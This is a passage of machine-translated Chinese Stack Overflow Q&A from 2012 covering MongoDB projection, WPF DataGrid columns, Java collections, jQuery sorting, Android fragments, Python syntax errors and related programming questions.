此外，您将附加`Myclass`而不是`myclass`- 即实际类，而不是您创建的实例 - 附加到列表中，因此您始终打印未修改的`a`和`b`来自类的内容。

# mongodb - mongodb子元素查询

> ID：14097176
> 
> 赞同：4
> 
> 时间：2012-12-31T03:40:42.293
> 
> 标签：mongodb

这是示例

```
> db.test.insert({ name: 'test', values: [ { check: true }, { check: false } ] })
> db.find({ values.check: true })[0] 
```

所以我得到了真假`check`：

```
{
        "_id" : ObjectId("50e22046dc278908f3a38a8e"),
        "name" : "test",
        "values" : [
                {
                        "check" : true
                },
                {
                        "check" : false
                }
        ]
} 
```

我想得到这个：

```
{
        "_id" : ObjectId("50e22046dc278908f3a38a8e"),
        "name" : "test",
        "values" : [
                {
                        "check" : true
                }
        ]
} 
```

是否有任何过滤命令？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-31T04:51:09.507

您可以使用`$`投影运算符仅包含`values`与查询匹配的第一个数组元素：

```
 db.test.find({ 'values.check': true }, {name: 1, 'values.$': 1}) 
```

返回：

```
{
    "_id": ObjectId("50e22046dc278908f3a38a8e"), 
    "name": "test", 
    "values": [ { "check": true } ] } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T03:50:18.553

```
$fetchcode = "Fetch an array from the mongo db"
   foreach ($fetchcode as $mainkey => $mainVariable) {
        foreach($mainVariable as $key2 => $doc2)
        {
            if($key2 == "check"){
                if($doc2 == "true")
                {
                   //Your Function Here
                }
            }
        }
    } 
```

你可以试试这个

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-31T18:49:02.143

```
> db.test.aggregate(
{ $unwind: "$values" },
{ $match: { "values.check": true } }
).result

[
        {
                "_id" : ObjectId("50e22046dc278908f3a38a8e"),
                "name" : "test",
                "values" : {
                        "check" : true
                }
        }
] 
```

# wpf - WPF DataGrid 列绑定被自动生成的列覆盖

> ID：14097180
> 
> 赞同：0
> 
> 时间：2012-12-31T03:41:23.157
> 
> 标签：wpf, wpfdatagrid

我正在使用 WPF Toolkit 中的 DataGrid - 最新的一个。但是下面的代码不起作用

XAML 代码

```
 <dg:DataGrid 
    Grid.Row="1"
    Name="eventLogGrid"
    Margin="5,0,5,0"
    BorderBrush="Black"
    ItemsSource="{Binding EventLogs}"
    SelectionMode="Single"
    IsReadOnly="True">
    <dg:DataGrid.Columns>
        <dg:DataGridTextColumn
            Binding="{Binding EventID}" Header="Event ID" />
        <dg:DataGridTextColumn
            Binding="{Binding Server}" Header="Server" />
        <dg:DataGridTextColumn
            Binding="{Binding Source}" Header="Source" />
        <dg:DataGridTextColumn
            Binding="{Binding Logged}" Header="Logged" />
    </dg:DataGrid.Columns>

</dg:DataGrid> 
```

C# 代码

```
public class EventLogItem
{
    public long EventID { get; set; }
    public string Name { get; set; }
    public string Message { get; set; }
    public Server Server { get; set; }
    public string Source { get; set; }
    public EventLogEntryType Level { get; set; }
    public DateTime Logged { get; set; }
    public string Machine { get; set; }
}
public List<EventLogItem> EventLogs
{
    get { return (List<EventLogItem>)GetValue(EventLogsProperty); }
    set { SetValue(EventLogsProperty, value); 
} 
```

这里真正的问题是，虽然我在 xaml 代码中指定了列及其绑定，但是当数据到达时，每个属性都占用一列。期望的效果是只显示那些绑定的属性。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T04:06:10.927

DataGrid 有一个属性`AutoGenerateColumns`，默认情况下设置为 true，从而为您提供您不期望的额外列。只需`AutoGenerateColumns="False"`在 DataGrid 的 xaml 声明中设置，您将只获得指定的列。

（就个人而言，我总是觉得这比方便更令人烦恼！）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-04-14T18:34:54.973

或者您可以设置`DataGrid`'s `AutoGenerateColumns`= ，定义一个处理事件`true`的简单`Behavior<DataGrid>`类，并在每个列的 Bound 属性上使用'属性来指定自定义列标题（和/或其他列属性）或抑制列（通过没有属性）。在此处查看这个伟大而简单的解决方案：[DataGrid.AutoGenerateColumns 的智能行为](https://www.codeproject.com/Articles/389764/A-Smart-Behavior-for-DataGrid-AutoGenerateColumn)。顺便说一句，我也刚刚注意到 Xceed自动（无需定义类）使用`AutoGeneratingColumn``System.ComponentModel``DisplayName``DataGridControl``Behavior<DataGridControl>``DisplayName`覆盖列标题的属性（如果有）。但是，如果属性不存在，它不会抑制列（我还没有研究它们是否支持以其他方式自动生成的列抑制）。`Loaded`我通过处理视图的事件并将列的`Visible`属性设置为`false`它的`Title`一些常量来表示它应该被抑制（即“_”）来半破解它。

# php - 虽然循环产生奇怪的 div 行为

> ID：14097182
> 
> 赞同：0
> 
> 时间：2012-12-31T03:42:15.497
> 
> 标签：php, html, css, while-loop

我的网站中运行了以下代码。完成以 2 到 2 显示项目，每次获得偶数时换行。

这都在一个 DIV 中：

```
while($info = $items->fetch(PDO::FETCH_ASSOC)) 
{
echo "<div name='item' id='".$info['color_base1']."' class='itemBox'>
<div class='showItem'><a href='items_descr.php?itemId=".$info[id_item]."'>
<img class='itemImage' alt='' src='images/$info[imageMid].jpg'></img></div></div><br />";
echo "<div class='indexItemText'><font class='similarItemsText'>
<a href='items_descr.php?itemId=".$info[id_item]."'>".$info[name]."</a>
<font class='price'> - $".$info[price]."</div>";
$row_count++;
if ($row_count % 2 == 0) 
    {
echo "<br />"; // close the row if we're on an even record
    }

} 
```

问题是我生成的 CSS 正在做一些奇怪的事情。它为第 2 个项目创建 div，然后为以下项目创建标签，以至于这些项目来自容器 div，它们应该被加载......

知道为什么会发生这种情况吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T06:51:10.670

请试试这个：-

```
$html = '';
while($info = $items->fetch(PDO::FETCH_ASSOC)) 
{
    $html.= "<div name='item' id='".$info['color_base1']."' class='itemBox'>
     <div class='showItem'><a href='items_descr.php?itemId=".$info['id_item']."'>
     <img class='itemImage' alt='' src='images/".$info['imageMid'].".jpg' /></div> </div><br />";

    $html.= "<div class='indexItemText'><font class='similarItemsText'>
       <a href='items_descr.php?itemId=".$info['id_item']."'>".$info['name']."</a></font>
       <font class='price'> -$".$info['price']." </font></div>";  

   $row_count++;
   if ($row_count % 2 == 0) 
    {
      $html.= "<br />"; // close the row if we're on an even record
    }
}
 echo $html; 
```

# java - java集合和errorlist混合问题

> ID：14097186
> 
> 赞同：0
> 
> 时间：2012-12-31T03:43:39.890
> 
> 标签：java, collections

我试图划分两个数组我试图做的是一个列表包含一些字符串，第二个列表包含一些其他字符串例如：列表 1 有**qw,we,er,rt,ty**和 list2 有**我们，**当我将 list1 从list2 输出应该是 -- **qw,rt,ty**这是我的代码

```
package Arraylist;

import java.util.*;
/**
 *
 * @author Charith
 */
public class arList {
    public static void main(String args[]) {
        String word[] = {
            "Hello", "Funny", "Bunny", "Honey"
        };
        List < String > l1 = new ArrayList < String > ();

        for (String s: word) {
            l1.add(s);
        }

        String deleteWord[] = {
            "Funny", "Bunny"
        };
        List < String > l2 = new ArrayList < String > ();

        for (String r: deleteWord) {
            l2.add(r);
        }

        for (int i = 0; i < l1.size(); i++) {
            System.out.printf("%s ", l1.get(i));
        }

        editlist(l1, l2);
        System.out.println();
        for (int i = 0; i < l1.size(); i++) {
            System.out.printf("%s ", l1.get(i));
        }

        * * public static void editlist(Collection < String > list1, Collection < String > list2) * * {
            Iterator < String > it = list1.iterator();
            while (it.hasNext()) {
                if (list2.contains(it.next()))
                    it.remove();
            }

        }

    }
} 
```

**但是我在public static void editlist(Collection list1,Collection list2)**线上得到一个错误，有人可以告诉我如何纠正这个错误，有人可以解释一下 java 中的 * *Collection* *s 是什么，我用谷歌搜索它，但它真的很混乱

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T03:47:05.983

您可以使用collectionUtil 的**removeAll** API 实现相同的目的。

```
list1.removeAll(list2); 
```

看看 [removeAll](http://docs.oracle.com/javase/7/docs/api/java/util/Collection.html#removeAll%28java.util.Collection%29) API。它将删除 list1 中存在于 list2 中的所有元素。所以在集合论中它是理想的`A-B`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-31T03:47:32.260

看看你的方法声明来自哪里。紧随其后的是：

```
for(int i =0;i<l1.size();i++){
    System.out.printf("%s " ,l1.get(i));
} 
```

换句话说，它仍然是`main`方法的一部分。`main`在声明新方法之前，您需要一个额外的右大括号来完成该方法。您不能声明一种方法而不是另一种方法（除了您在此处未使用的内部类）。

还有更好的方法可以实现您想要的，但这是另一回事 - 正如 Priyank 的回答所说，`removeAll`这将是一种更简单的方法。

# jquery - 当我不断选择一个选项时，表格的大小不断增加

> ID：14097201
> 
> 赞同：0
> 
> 时间：2012-12-31T03:46:47.440
> 
> 标签：jquery, html, css, jsfiddle

我的控件出现问题，导致表格单元格不断增加。

我在这里有一个应用程序：[应用程序](http://helios.hud.ac.uk/u0867587/Mobile_app/QandATable3.php)

请打开应用程序并按照以下基本步骤操作：

1.  当您打开应用程序时，单击“添加问题”按钮以附加表格行。

2.  在您附加的行中单击“打开网格”并选择按钮“3”，然后再次打开网格并选择按钮“4”。通过选择按钮“3”和“4”保持交替，您应该能够看到控件保持略微向下移动，这意味着每次选择选项时表格都会略微增加。

现在奇怪的是我有一个包含相同代码的jsfiddle，但它在小提琴中没有这个问题，面对小提琴是我希望我的应用程序运行的确切方式：http: [//jsfiddle.net /XM8hG/7/](http://jsfiddle.net/XM8hG/7/)

现在我认为下面的代码会导致这个问题，因为每次用户选择一个选项时，我希望 textarea 在它的表格单元格中保持全高：

查询：

```
 $('.gridBtns').on('click', function()

    {

...

setWidth();

)};

function setWidth() {
    var questionCellWidth = $("#qandatbl_onthefly tbody .question").width();
    var questionCellHeight = $("#qandatbl_onthefly tbody .question").height();
    $(".textAreaQuestion").css({
        "width": (questionCellWidth - 6) + "px",
        "height": (questionCellHeight) + "px"
    });
} 
```

现在我需要上面的代码让 textarea 在表格单元格中保持全高，但是我需要包含或更改什么才能在每次选择选项时停止表格增加？

实际上有没有一个地方我可以放置`setWidth()`，以便每个单元格中的每个文本区域都将为它们所在的每个表格单元格填充 hegiht，而不是单击选项？像它识别表格已经扩展，因此当它意识到表格单元格增加时它会扩展文本区域的高度以自行填充表格单元格

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T04:11:33.413

您将 textarea 的高度设置为其父单元格的高度，如果不是更大的话，它将至少具有相同的大小。

在我的浏览器中，textarea 的边距为 2px，因此父单元格至少大 4px 以容纳 textarea 及其填充。因此，每次您调用`setWidth()`它时，它都会至少增加该数量。

如果您希望 textarea 始终填充单元格，则应设置表格单元格的大小并单独保留 textarea - 将其宽度和高度属性设置为`100%`以填充单元格。

* * *

编辑：

所以在 CSS 中：

`.textAreaQuestion { ... width: 100%; height: 100%; ... }`

并从事件处理程序中删除对 setWidth 的调用`$('.gridBtns').on('click')`。

# asp.net - 方法调用计数 asp.net

> ID：14097208
> 
> 赞同：1
> 
> 时间：2012-12-31T03:47:44.733
> 
> 标签：asp.net, performance

在我的 ASP.NET 应用程序中，我抓住了罪魁祸首，其中一个对 DB 连接执行简单调用的方法被多次调用（我设置了一个断点，它被命中了几次，出乎意料），什么是适合使用的工具case 来分析和计算一个方法被调用了多少次以及哪个方法正在调用它？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-31T04:06:32.487

如上所述，您可以使用 ANTS profiler 等工具。如果您只想查看谁在调用您的方法，可以使用 Visual Studio 的调用层次结构功能。您可以在`View`菜单中或通过单击 Ctrl+Alt+K 找到它。

这是一个使用它的小教程：http: [//blogs.msdn.com/b/zainnab/archive/2010/01/19/using-the-call-hierarchy-c-only-vstiptool0005.aspx](http://blogs.msdn.com/b/zainnab/archive/2010/01/19/using-the-call-hierarchy-c-only-vstiptool0005.aspx)

这具有免费且已经存在的优势。

# python - 编程风格约定：[+]、[-]、[*]、[!]

> ID：14097209
> 
> 赞同：8
> 
> 时间：2012-12-31T03:47:52.987
> 
> 标签：python, styles, convention

我无法通过谷歌搜索找到答案，因为谷歌显然不允许搜索标点符号。

在报告程序的标准输出时（我正在使用 Python），是否有人`[+]` `[-]` `[*]` `[!]`在行首有任何样式规则？例如

```
[+] Searching for item one...
[-] Not found: item one.
[+] Searching for item two...
[!] Found: item two. 
```

我可以自己想出一个系统，但因为我偶尔会看到这些，我想知道是否有人知道一个普遍接受的系统供使用？

# filemaker - 如何在 Filemaker Pro 中显示组内的累积总和

> ID：14097212
> 
> 赞同：0
> 
> 时间：2012-12-31T03:48:45.673
> 
> 标签：filemaker

如果不确定这在 Filemaker Pro 12 中是否可行，但我想从某些数据列中获得累积总和并将其显示在布局表单视图中。

例如，如果我有一个包含五个字段的表

```
ID  Type    Lymph   Neutro    Eosin   Mono
1   A       10      5         3       2
2   A       8       7         2       3
3   B       5       1         0       0 
```

现在我可以添加一个列，在其中计算每一行的淋巴、中性、曙红和单声道的总和。但是，我想要一个列，其中包含每种类型的这些列的总和。理想情况下，我会在布局上显示累积总和，这样当我输入数据时，我就可以看到我计算过的单元格总数。

```
ID  Type    Lymph   Neutro    Eosin   Mono  RowSum  CumSum
1   A       10      5         3       2     20      20
2   A       8       7         2       3     20      40
3   B       5       1         0       0     6       6 
```

通用（虚构）计算机语言的总体思路是这样的：

```
CumSum = if(Type[ID] == Type[ID-1], RowSum[ID] + CumSum[ID-1], else(RowSum[ID])) 
```

这甚至可能吗？我对 Filemaker Pro 完全陌生，因此将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T19:26:37.627

您正在寻找汇总字段。本质上，要创建汇总字段，您需要进入

文件>管理>数据库...

并创建一个类型设置为摘要的新字段。当您按下创建时，会弹出一个框，让您选择要总结的内容。

现在要了解的重要一点是，该字段将根据它在报表中的放置位置确定要添加哪些记录。

您要做的是创建一个报表布局，并有一个按类型排序时为小计的部分。然后，您将汇总字段放在报告的该部分，并按类型对报告进行排序。

此外，我通常会创建自己的汇总字段，但 Filemaker 可能会在您创建报表布局时自动为您创建它们。

这里有关于汇总字段的更多信息

[Filemaker 摘要字段](http://www.filemaker.com/help/html/create_db.8.16.html)

还有更多关于创建布局的信息here

[在 Filemaker 中创建布局](http://www.filemaker.com/help/html/create_layout.9.3.html)

# jquery - 仅加载表排序中的最后一个 AJAX 请求

> ID：14097216
> 
> 赞同：0
> 
> 时间：2012-12-31T03:49:39.760
> 
> 标签：jquery, ajax, sorting

[对于这个问题](https://stackoverflow.com/questions/13901360/youtube-api-orderby-duration-not-handling-the-entire-playlist-just-the-newest)，我创建了以下示例解决方案：http: [//jsfiddle.net/PKcnb/3/](http://jsfiddle.net/PKcnb/3/)。

该代码通过 YouTube API 请求 50 个视频（由于请求限制）。每个请求都会在最终表中追加一个新行。我想要一个简单的排序解决方案，所以我使用了 jquery.sortElements.js。

sortElement.js 似乎可以工作，但它只是对最后一次请求中的视频进行排序。为什么整个表没有排序？环顾四周，看起来我需要[实现 .live()](http://api.jquery.com/live/)但我的尝试没有成功。

**相关的jQuery**

```
// Recursive function to grab the next set of videos
function getVideos(index, max) {
    $.ajax({
        url: 'https://gdata.youtube.com/feeds/api/playlists/UUAuUUnT6oDeKwE6v1NGQxug?v=2&orderby=duration&max-results=50&start-index=' + index,
        //  'https://gdata.youtube.com/feeds/api/users/tedtalksdirector/uploads',
        dataType: "xml",
        success: function(xml) {
            var videos = $(xml).find("entry");

            videos.each(function() {
                var title = $(this).find("title").text();
                var duration = $(this).find("duration").attr("seconds");
                var minutes = Math.floor(duration / 60);
                var seconds = (duration % 60);

                if (seconds < 10) seconds = "0" + seconds;

                var newRow = $("<tr></tr>");
                newRow.append("<td>" + title + "</td>");
                newRow.append("<td class='dur'>" + duration + "</td>");
                $("tbody#videos").append(newRow);

            });

            newIndex = index + 50;

            $('#VideosLoaded').html(newIndex - 1);

            if (newIndex < max) {
                getVideos(newIndex, max);
            }
        }
    });
}

// Make table sortable (jquery.sortElements.js)
// via https://stackoverflow.com/questions/5066002/sending-one-ajax-request-at-a-time-from-a-loop
var table = $('table');
$('#Title, #Duration').wrapInner('<span title="sort this column"/>').each(function() {

    var th = $(this),
        thIndex = th.index(),
        inverse = false;

    th.click(function() {

        table.find('td').filter(function() {

            return $(this).index() === thIndex;

        }).sortElements(function(a, b) {

            return $.text([a]) > $.text([b]) ? inverse ? -1 : 1 : inverse ? 1 : -1;

        }, function() {
            // parentNode is the element we want to move
            return this.parentNode;
        });
        inverse = !inverse;
    });
});​ 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T18:43:47.047

我认为排序例程会像这样更好地工作：

```
$('#Title, #Duration').wrapInner('<span title="sort this column"/>').each(function() {
    var th = $(this),
        thIndex = th.index(),
        inverse = false;
    th.click(function() {
        table.find('td').filter(function() {
            return $(this).index() === thIndex;
        }).sortElements(function(a, b) {
            var id = th.attr('id'),
                a = (id === 'Duration') ? parseInt($(a).text()) : $(a).text(),
                b = (id === 'Duration') ? parseInt($(b).text()) : $(b).text(),
                x = (a === b) ? 0 : (a > b) ? 1 : -1;
            return (x === 0) ? 0 : inverse ? -x : x;
        }, function() {
            return this.parentNode;     
        });
        inverse = !inverse;
    });
}); 
```

[更新的小提琴](http://jsfiddle.net/PKcnb/8/)

# android - 是否可以在活动中更改 xml 布局文件

> ID：14097218
> 
> 赞同：0
> 
> 时间：2012-12-31T03:49:58.827
> 
> 标签：android, layout, dynamic

目前我有一个应用程序，它从启动时完成的数据库调用加载其大部分数据。它的 onCreate 方法正确地调用了相关的 xml 布局文件，一旦数据出现，一切都很好。在创建该数据并将其发送到解析并加载的手机之前，主屏幕保持黑色。这是我的第一个 inApp 购买应用程序，它是根据 Google 提供的 TrivialDrive 示例文件构建的。我想做的是加载图像，然后开始数据检索例程，然后在此时开始正常功能，包括预构建的 xml 文件。

我考虑过简单地创建一个启动活动，但它不会做同样的事情，只是加载图像，然后当我在数据加载时在正常的 Activity 布局文件中点击新的 oncreate 方法时返回黑色。

我不知道。

我希望有一个单独的 Activity 加载布局文件（带有图像）当应用程序知道数据已被检索时开始数据检索使用我当前使用的实际 xml 布局文件加载数据

这是可能的还是有人知道我怎么能做到这一点

我可以尝试的另一件事是动态创建布局以显示图像，然后在检索数据后如何加载现有布局，或者我会被卡住动态创建整个布局文件？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T04:11:18.147

创建一个 ImageView iv 并将所需的图像设置为该 imageview。然后调用 setContentView(iv)。稍后，一旦您完成所有工作，再次调用 setContentView(R.layout.yourlayout)，这可以解决您的问题。setContentView() 方法可以被多次调用，但要确保一旦你改变了布局，它的所有视图也会被改变。所以你找不到另一个布局中的视图。

# java - 重新加载片段

> ID：14097225
> 
> 赞同：2
> 
> 时间：2012-12-31T03:50:55.270
> 
> 标签：java, android, android-fragments, android-actionbar, fragment

我只是好奇，因为我在 FragmentActivity 中设置了 Fragment 选项卡，如何从 FragmentActivity 或从 Fragment 本身重新加载片段，以清除并重新加载该选项卡。当我重新选择要发生的选项卡时，当它替换片段时，我基本上需要发生相同的事情。有没有一种简单的方法可以做到这一点并重新加载片段？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-31T04:26:00.673

创建一个开始 FragmentTransaction、分离片段并提交的方法。然后开始一个新的 FragmentTransaction 附加片段并提交。这应该破坏视图层次结构，再次创建它，将其附加到 UI 并显示它。每当您需要刷新片段时，请调用此方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-03-11T13:57:32.397

你可以这样做：

```
fm=getActivity().getSupportFragmentManager();
{
fm.beginTransaction().replace(Containername, new CurrentFragmentname, CurrentFragment.class.getName()).commit();
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-12-28T08:10:12.070

嗨，答案其实很简单， **getFragmentManager().beginTransaction().detach(this).attach(this).commit();**

# c++ - 如何制作正则表达式来过滤所有特殊符号？

> ID：14097227
> 
> 赞同：0
> 
> 时间：2012-12-31T03:51:18.490
> 
> 标签：c++, regex, boost, unicode, c++11

我的 IDE 是 VS 2012，我使用 C++ 0x。我想处理一个中文字符串并用另一个词替换一个词，即使这个词被一些特殊符号分割。我列举了键盘上的所有特殊符号，效果很好。代码是这样的：

```
std::wstring ws_str = L"性 \t\r\n`~!@#$%^&*()-_=+[{]}\\|;:'\",<.>/?爱";
std::wregex wrx(L"性[\\s`~!@#$%^&*()-_=+\\[\\{\\]\\}\\|;:'\",<.>/?]*爱");
std::wstring wfmt(L"革命");
std::locale::global(std::locale("chs"));
std::wstring ws_res = std::regex_replace(ws_str, wrx, wfmt); 
```

但是上面的代码有它的弱点：我不能枚举所有不在键盘上的符号。有没有其他方法可以达到我的目标？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-04T08:54:06.350

性(\W|_)*爱可以解决我的问题，\W表示排除所有字符（包括中文或其他语言）和下划线符号' `_`'，所以我附加' `_`'并满足要求。

# python - 我不明白这段代码有什么问题

> ID：14097235
> 
> 赞同：0
> 
> 时间：2012-12-31T03:53:28.453
> 
> 标签：python, python-2.5

我收到以下代码错误，我不明白它有什么问题。

我只是想学习如何做到这一点，这是一个测试。

我不知道出了什么问题或如何解决它。

```
print "Would you like to see today's weather?"

answer = input

if answer = "yes":
    print "Follow Link: http://www.weather.com/weather/right-now/Yorktown+VA+23693 "
elif answer = "no":
    print "Very well, would you like to play a guessing game?"
    if answer = "yes":
        import random

        secret = random.randint (1, 99)
        guess= 0
        tries= 0

        print "AHOY!  I'm the Dread Pirate Roberts, and I have a secret!"
        print "It is a number from 1 to 99\. I'll give you 6 tries. "

        while guess != secret and tries < 6:
            guess = input("What's your guess? ")
            if guess < secret:
                print "Too low, ye scurvy dog!"
            elif guess > secret:
                print "Too high, landlubber!"
            tries = tries + 1
            if guess == secret:
                print "Avast! Ye got it! Found my secret ye did!"
    elif answer = "no":
        print "Thank you, and goodnight." 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-31T03:56:55.407

**第一个**错误在这里：

```
if answer = "yes": #This would be giving you a syntax error 
```

您想要做的是比较（在您的代码中，每个测试用例都相同）：

```
if answer == "yes": #Notice the double equals to sign 
```

* * *

**另外，**您想调用输入函数：

```
answer = input() #Notice the parentheses 
```

* * *

**第三个**错误（这是一个合乎逻辑的错误）：

```
print "Very well, would you like to play a guessing game?"
#You are missing an input statemtent
if answer = "yes": 
```

* * *

**再说一次，**同样的错误：

```
print "It is a number from 1 to 99\. I'll give you 6 tries. "
#You are agin missing an input statement
while guess != secret and tries < 6: 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-31T04:00:34.167

除了 AshRj 指出的，这里还有两个更明显的错误：

```
answer = input 
```

这会将实际函数“ `input`”分配给`answer`，而不是调用该函数。此外，您可能想`raw_input`改用。所以，使用`answer = raw_input()`.

```
elif answer = "no":
    print "Very well, would you like to play a guessing game?"
    if answer = "yes": 
```

您没有在这些比较之间获得新的答案，所以当您再次测试时`answer`仍然如此。`no`

# c++ - C++：递归回溯 boggle grid

> ID：14097236
> 
> 赞同：2
> 
> 时间：2012-12-31T03:53:30.473
> 
> 标签：c++, recursion, backtracking, boggle

我意识到这段代码可能有点难以阅读，我试图做的是调整一个标准的递归迷宫求解算法——在找到解决方案之前尝试所有方向，以适应游戏“boggle”的算法它检查目标词是否可以通过四个方向中的任何一个在网格上形成。我意识到这段代码有不止一个错误，但我想要一些关于如何解决最重要问题的输入，例如它搜索网格的方向和方式显然不起作用。

控制台输出：

```
Enter word: 
aefn
First matching letter found at [row: 0] [col: 0]
findNext: Point location: Y[0] X[0]

Point location: Y[0] X[-1]
A //(This is the algorithm trying to find "targetWord" on grid "currentWord")
Point location: Y[1] X[0]
AA
Point location: Y[0] X[0]
AAE
Point location: Y[0] X[-1]
AAEA
Point location: Y[1] X[0]
AAEAA
Point location: Y[0] X[1]
AAEAAA
Point location: Y[-1] X[0]
AAEAAAA
Point location: Y[1] X[1]
AAEE
Point location: Y[1] X[0]
AAEEU
Point location: Y[2] X[1]
AAEEUU
Point location: Y[1] X[2]
AAEEUUU
Point location: Y[0] X[1]
AAEEUUUU
Point location: Y[0] X[2]
AAEEE
Point location: Y[-1] X[1]
AAEEEE
Point location: Y[0] X[1]
AAA
Point location: Y[1] X[-1]
AAAE
Point location: Y[2] X[0]
AAAEE
Point location: Y[1] X[1]
AAAEEE
Point location: Y[0] X[0]
AAAEEEE
Point location: Y[-1] X[0]
AAAA 
```

代码：

```
enum Direction { NORTH,
                 EAST,
                 SOUTH,
                 WEST };

/**  Attempts to find a matching letter on the grid to the first letter in the 
  *  targetWord, if found it stores it location in grid in 'point' and calls
  *  findNext() with the location of matching letter stored in the 'point'.  
  */
bool findMatchingFirstLetter(Grid<char> &cubeGrid, string currentWord, string targetWord, int index)
{

    for (int row = 0; row < cubeGrid.numRows(); row++)
    {
        for (int col = 0; col < cubeGrid.numCols(); col++)
        {
            if (cubeGrid.get(row, col ) == targetWord[0])
            {
                cout <<  "First matching letter found at [row: " << row << "] [col: " << col << "]" << endl;
                GPoint point(col, row);
                cout << "findNext: " << findNextRecur(cubeGrid, currentWord, targetWord, index, point) << endl;

            }
        }
    }
    return false;
}

/**  Recursive function.
  *  Exhaustively searches the grid for all possible combinations, moving in all 
  *  compass directions. */
bool findNextRecur(Grid<char> &cubeGrid, string currentWord, string targetWord, int index, GPoint point)
{
    cout << "Point location: Y[" << point.getY() << "] X[" << point.getX() << "]" << endl;
    cout << currentWord << endl;
    if (currentWord == targetWord)
        return true;
    if (currentWord.length() > targetWord.length() || 
        point.getX() > cubeGrid.numCols() ||
        point.getX() < 0 ||
        point.getY() > cubeGrid.numRows() ||
        point.getY() < 0)
    { return false; }

    for (Direction dir = NORTH; dir <= WEST; dir++ )
    {

        if (findNextRecur(cubeGrid,
                          currentWord += cubeGrid.get(point.getY(), point.getX()),
                          targetWord,
                          index,    //index is currently not in use.
                          adjacentPoint(point, dir)))
        { return true; }
    }
}

GPoint adjacentPoint(GPoint point, Direction dir)
{
    switch  (dir) {
        case NORTH: return GPoint(point.getY()-1, point.getX());
        case EAST: return GPoint(point.getY(), point.getX()+1);
        case SOUTH: return GPoint(point.getY()+1, point.getX());
        case WEST: return GPoint(point.getY(), point.getX()-1);
    }
    return point;
}

/**  Wrapper 
  */
bool findWordOnGrid(Grid<char> &cubeGrid, string word)
{
    cout << findMatchingFirstLetter(cubeGrid, "", toUpperCase(word), 0) << endl;
    return true;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T04:39:43.210

不确定这是否是唯一的问题，但`currentWord += ...`应该只是在探测 4 个方向中`currentWord + ....`的每一个时`+=`更改局部变量，而不是简单地将新的传递给递归函数。`currentWord``currentWord`

# express - npm 安装问题

> ID：14097237
> 
> 赞同：4
> 
> 时间：2012-12-31T03:53:32.553
> 
> 标签：express, npm

我已经安装了 express、fs 和几个软件包。当我做

```
npm ls 
```

我收到以下错误：

```
â   âââ mime@1.2.6
âââ fs@0.0.0 extraneous
âââ node-uuid@1.4.0

npm ERR! extraneous: fs@0.0.0 /home/user123/trail/node_modules/fs
npm ERR! extraneous: express@3.0.5 /home/user123/trail/node_modules/express
npm ERR! not ok code 0 
```

我不确定如何消除此 ERR？我可以使用 azure 和 express 运行我的示例应用程序。不确定它是否来自 sudo npm ？如果是这样的话。我想知道什么时候需要 sudo npm list (global)？以及何时来自 npm 列表（本地）。

```
sudo npm ls 
```

没有错误

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-14T06:30:12.410

npm prune 应该照顾它。除了它在事后删除依赖关系。这可能不是你想要做的。

如果您需要依赖项，请在 package.json 中声明它，如下所示：

...“依赖”：{“快递”：“3.0.5”}，...

另请注意，依赖项“fs”是节点的一部分，无需在 package.json 中显式声明。

# php - 在 PHP 表单中，如何在其父元素隐藏时阻止或禁止发布输入元素？

> ID：14097238
> 
> 赞同：0
> 
> 时间：2012-12-31T03:53:36.230
> 
> 标签：php, javascript, html

> **可能重复：**
> [如何避免将 display:none 隐藏的输入字段发送到服务器？](https://stackoverflow.com/questions/1374147/how-to-avoid-sending-input-fields-which-are-hidden-by-displaynone-to-a-server)

```
<div style="display:none;">
  <input type="text"/>
</div> 
```

使用上面的代码，输入将在提交表单时发布。但是如何避免提交隐藏父元素的输入元素呢？任何想法将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T05:01:53.223

在发布您的表单时，有一个`onClick`函数并在其中编写以下代码。此代码将帮助您找到所有`div`标签，即`display:none`div 为 display:none，它将禁用所有输入元素。

检查这个[http://jsfiddle.net/xyuY6/3/](http://jsfiddle.net/xyuY6/3/)

```
var divs= document.getElementsByTagName('div');
for(var i = 0;i < divs.length; i++) {
    if(divs[i].style.display == 'none') {
        if ( divs[i].hasChildNodes() ){
           var inputs = divs[i].getElementsByTagName('input');
           for(var j = 0;j < inputs.length; j++) {
               inputs[j].disabled = true;
           }
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T04:52:05.060

如果在提交之前没有其他方法可以做，请使用 Javascript 从隐藏的 div 中删除所有子元素，这样您就不会在 POST 中获取它们。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-31T03:56:29.883

改为使用`display:none`将解决您的问题。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-31T04:00:50.613

设置`disabled`在输入元素上。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-31T04:07:00.107

这不是 PHP 问题，而是 HTML/DOM 问题。正如一个人在您的原始线程上评论的那样，如果您通过 PHP 生成此代码，您应该`disabled='disabled'`在您的 input 元素中包含以防止提交并在通过 javascript 取消隐藏父元素时删除 disabled 属性以允许再次提交元素值.

如果您需要进一步的帮助，我会在此答案中添加 HTML 和 Javascript 标记。

